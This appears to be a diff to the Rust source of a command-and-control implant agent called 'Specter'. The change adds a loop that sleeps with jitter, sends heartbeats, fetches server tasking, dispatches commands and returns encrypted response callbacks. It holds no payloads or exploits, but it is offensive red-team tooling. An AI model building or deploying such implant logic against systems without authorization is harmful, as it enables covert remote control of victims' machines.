@@ -8,6 +8,7 @@ use red_cell_common::demon::{DemonCommand, DemonMessage};
 use tracing::{info, warn};
 
 use crate::config::SpecterConfig;
+use crate::dispatch::{self, DispatchResult};
 use crate::error::SpecterError;
 use crate::protocol::{
     AgentMetadata, build_callback_packet, build_init_packet, parse_init_ack, parse_tasking_response,
@@ -129,7 +130,13 @@ impl SpecterAgent {
         Ok(message)
     }
 
-    /// Run the main agent loop: init, then checkin repeatedly.
+    /// Run the main agent loop: init, then dispatch server tasking repeatedly.
+    ///
+    /// Each iteration:
+    /// 1. Sleeps for the configured interval (with optional jitter).
+    /// 2. Sends a `CommandCheckin` heartbeat.
+    /// 3. Sends `CommandGetJob` and dispatches any returned task packages.
+    /// 4. Sends a response callback for each dispatched command.
     pub async fn run(&mut self) -> Result<(), SpecterError> {
         self.init_handshake().await?;
 
@@ -137,23 +144,79 @@ impl SpecterAgent {
             let delay = self.compute_sleep_delay();
             tokio::time::sleep(std::time::Duration::from_millis(delay)).await;
 
-            match self.checkin().await {
-                Ok(response) => {
-                    if !response.is_empty() {
-                        info!(
-                            agent_id = format_args!("0x{:08X}", self.agent_id),
-                            response_len = response.len(),
-                            "received tasking response"
-                        );
-                    }
-                }
+            // Heartbeat — lets the server record liveness; response is normally NOJOB.
+            if let Err(e) = self.checkin().await {
+                warn!(
+                    agent_id = format_args!("0x{:08X}", self.agent_id),
+                    error = %e,
+                    "checkin failed, will retry"
+                );
+                continue;
+            }
+
+            // Request and dispatch any queued server tasking.
+            let message = match self.get_job().await {
+                Ok(m) => m,
                 Err(e) => {
                     warn!(
                         agent_id = format_args!("0x{:08X}", self.agent_id),
                         error = %e,
-                        "checkin failed, will retry"
+                        "get_job failed, will retry"
+                    );
+                    continue;
+                }
+            };
+
+            for package in &message.packages {
+                let result = dispatch::dispatch(package, &mut self.config);
+                if self.handle_dispatch_result(package.request_id, result).await {
+                    // Exit requested — terminate.
+                    return Ok(());
+                }
+            }
+        }
+    }
+
+    /// Process one dispatch result, sending any required response packets.
+    ///
+    /// Returns `true` if the agent should terminate.
+    async fn handle_dispatch_result(&mut self, request_id: u32, result: DispatchResult) -> bool {
+        match result {
+            DispatchResult::Ignore => false,
+            DispatchResult::Exit => {
+                info!(
+                    agent_id = format_args!("0x{:08X}", self.agent_id),
+                    "CommandExit received — terminating"
+                );
+                true
+            }
+            DispatchResult::Respond(resp) => {
+                if let Err(e) =
+                    self.send_callback_raw(resp.command_id, request_id, &resp.payload).await
+                {
+                    warn!(
+                        agent_id = format_args!("0x{:08X}", self.agent_id),
+                        command_id = resp.command_id,
+                        error = %e,
+                        "failed to send response"
                     );
                 }
+                false
+            }
+            DispatchResult::MultiRespond(resps) => {
+                for resp in resps {
+                    if let Err(e) =
+                        self.send_callback_raw(resp.command_id, request_id, &resp.payload).await
+                    {
+                        warn!(
+                            agent_id = format_args!("0x{:08X}", self.agent_id),
+                            command_id = resp.command_id,
+                            error = %e,
+                            "failed to send response"
+                        );
+                    }
+                }
+                false
             }
         }
     }
@@ -187,11 +250,23 @@ impl SpecterAgent {
         request_id: u32,
         payload: &[u8],
     ) -> Result<Vec<u8>, SpecterError> {
+        self.send_callback_raw(u32::from(command), request_id, payload).await
+    }
+
+    /// Send a callback packet with a raw `command_id` (used by the dispatch loop
+    /// to forward arbitrary response command IDs without converting through the
+    /// typed `DemonCommand` enum).
+    async fn send_callback_raw(
+        &mut self,
+        command_id: u32,
+        request_id: u32,
+        payload: &[u8],
+    ) -> Result<Vec<u8>, SpecterError> {
         let packet = build_callback_packet(
             self.agent_id,
             &self.session_crypto,
             self.ctr_offset,
-            u32::from(command),
+            command_id,
             request_id,
             payload,
         )?;
